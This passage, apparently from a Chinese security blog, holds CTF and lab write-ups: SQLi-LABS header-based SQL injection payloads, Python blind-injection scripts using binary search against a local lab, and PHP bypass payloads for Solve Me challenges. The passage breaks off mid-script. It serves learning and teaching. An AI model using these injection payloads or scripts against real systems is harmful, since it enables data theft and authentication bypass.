class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>现在就可以直接使用报错注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>从上一题开始这里的每一道题目都需要登陆一下才行<br>这一次回显的是在referer上面<br>尝试在referer上面测试1’ and ‘1’=’1<br>直接回显<br>说明这一次的注入点是在referer上面<br>然后像刚才一样直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>登陆后发现很明显的cookie字样猜测应该是cookie注入<br>退出后尝试在http头处尝试cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure><p>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>应该是单引号闭合<br>再尝试<br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code>成功回显<br>下面就很好办了，直接报错注入就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>这一题明显发现uname那一部分经过了base64加密<br>我们加上单引号再尝试加密发送看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>出现跟上一题一样的报错，看来是一样的了，就是加上base64加密而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>把上面这一串base64加密就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>直接回显你想要的东西，成功</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这一题就是上一题的套路，只是把单引号笔换成了双引号而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4i</span><br></pre></td></tr></table></figure><p>出现报错<br>直接<code>admin&quot; or &quot;1&quot;=&quot;1</code> 闭合一下加密提交就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4iIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显正常<br>开始报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p>加密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显数据库成功</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>SQLi-LABS Page-1(Basic Challenges)的22题就已经全部完爆了<br>这里面的22道题目都是把一些常见的注入类型给过了一遍，我觉得大概都是四种类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入</span><br><span class="line">报错注入</span><br><span class="line">bool盲注</span><br><span class="line">时间盲注</span><br></pre></td></tr></table></figure><p>后面的从18关开始就开始是http头的注入，但无论是什么注入，关键是要找到注入点在哪里，然后用合适的方法去闭合相关语句，然后再用正常的语句去查询你所需要的信息就好了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>二分查找在sql盲注里面的应用</title>
    <link href="0verwatch.top/bin-search-sql.html"/>
    <id>0verwatch.top/bin-search-sql.html</id>
    <published>2018-08-27T02:53:50.000Z</published>
    <updated>2018-08-27T02:57:04.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用<br>确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下<a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>二分查找又称折半查找，优点是比较次数少，查找速度快，平均性能好；其缺点是要求待查表为有序表，且插入删除困难。因此，折半查找方法适用于不经常变动而查找频繁的有序列表。首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> 最优时间复杂度：O(1)<br> 最坏时间复杂度：O(logn)</p><p><img src="https://s1.ax1x.com/2018/08/27/Pqwqeg.png" alt="Pqwqeg.png"></p><p>可以自行对比一下两组代码的不同<br>这是自增的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>下面是使用二分法去搜索，我这里使用非递归的办法去实现二分查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用&gt;去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):  <span class="comment">#这个地方可能会有些问题，数据库长度未知的时候过长会出现重复字母到时候自行删除即可</span></span><br><span class="line">min = <span class="number">65</span></span><br><span class="line">max = <span class="number">122</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">payload = url.format(_=i,__ = mid)</span><br><span class="line">ans = requests.get(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line"></span><br><span class="line">database += chr(max)</span><br><span class="line"><span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/27/Pq0imF.png" alt="Pq0imF.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用&lt;br&gt;确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="二分查找" scheme="0verwatch.top/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Solve Me解题记录</title>
    <link href="0verwatch.top/Solve-Me-wp.html"/>
    <id>0verwatch.top/Solve-Me-wp.html</id>
    <published>2018-08-14T10:23:48.000Z</published>
    <updated>2018-08-19T14:13:10.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站<a href="http://solveme.peng.kr" target="_blank" rel="noopener">http://solveme.peng.kr</a> 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊<a id="more"></a>~</p><p>##正文</p><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>给出来一个密文和一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题直接反过来写代码即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($s))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'尊찢悼嚴隆'</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以知道我们要传进get参数，但是<code>===</code>后面的内容不在可见的ASCII码范围内于是我们抓包看一下<br>找到对应字符串的ASCII码，我们知道单引号url编码为%27,两个27之间的就是那串字符串的ASCII码，<br>直接构造<code>payload：?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code>,得到flag</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们运用了<code>int的强制转换</code>和<code>科学计数法</code><br>这个题目先使用科学计数法绕过前面的两个<code>time</code>以及<code>is_numeric</code>，最后通过int的阶段获取到flag，因为<code>60 * 60 * 24 * 30 * 2=5.184*10^6</code><br>现在的<code>payload：?time=5.185e6</code>,sleep大约5秒后出现flag<br>为什么出现这样的效果我们来测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $time = <span class="string">'5.185e6'</span>;</span><br><span class="line"> $num1 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;</span><br><span class="line"> $num2 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span><br><span class="line"> var_dump(!is_numeric($time));</span><br><span class="line"> var_dump($time&gt;$num1);</span><br><span class="line"> var_dump($time&lt;$num2);</span><br><span class="line"> var_dump((int)$time);</span><br><span class="line"></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">int(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>一开始上手这一个题目，发现什么头绪也没有，因为他的那些参数我一个都不知道，发现url有点奇怪后来就尝试着直接去访问<code>index.php</code>，网页顿了一下又回到了login.php，怀疑存在<code>302跳转</code>，于是抓包看一下，果然重定向到<code>login.php</code><br>但同时我们也得到flag</p><p>还有第二种方法，直接curl一下看情况<br><a href="https://imgchr.com/i/P21ZSH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P21ZSH.md.png" alt="P21ZSH.md.png"></a></p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">   $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">   <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">       <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">           $key = $param;</span><br><span class="line">           $value = <span class="string">""</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">           $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们可以发现存在parse_url函数，这个函数有个漏洞可以用多个/符号去绕过，然后就不会执行<code>die(&quot;no hack&quot;)</code>;转而执行了下面的语句。<br>这里有篇方方土学长写过的总结:<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">点我</a><br>构造的<code>payload：///?do_you_want_flag=yes</code><br>后来发现还有官方的解法，就是利用描点去绕过，从来都不知道还可以这样搞<br><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes</code></p><p>#Hash collision</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这种题目做了很多遍了，就是利用数组返回NULL去绕过，构造下面的payload</p><p><code>?foo[]=1&amp;bar[]=2</code></p><h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>发现要跟<code>./secret.passwd</code>路径下的内容一样，先去里面看一下，发现字符串<code>simple_passw0rd</code><br>这个题目get到了一个新的知识点</p><p>就是chr()这个函数再ASCII码超过255的时候会自动取余，我们利用这个特性去拼接username的字符串，于是写了个Python脚本构造payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># 